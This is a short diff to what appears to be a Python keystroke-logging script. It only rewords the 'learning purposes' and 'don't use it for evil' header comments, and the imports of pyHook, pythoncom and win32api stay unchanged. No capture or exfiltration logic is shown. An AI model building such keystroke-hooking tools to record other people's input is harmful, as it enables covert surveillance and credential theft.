@@ -1,5 +1,5 @@
-#Built for learning purposes
-#Please don't use it for bad 
+#Made for learning purposes
+#Please don't use it for evil
 
 import pyHook, pythoncom, sys, logging, win32api
 from pyHook import HookManager
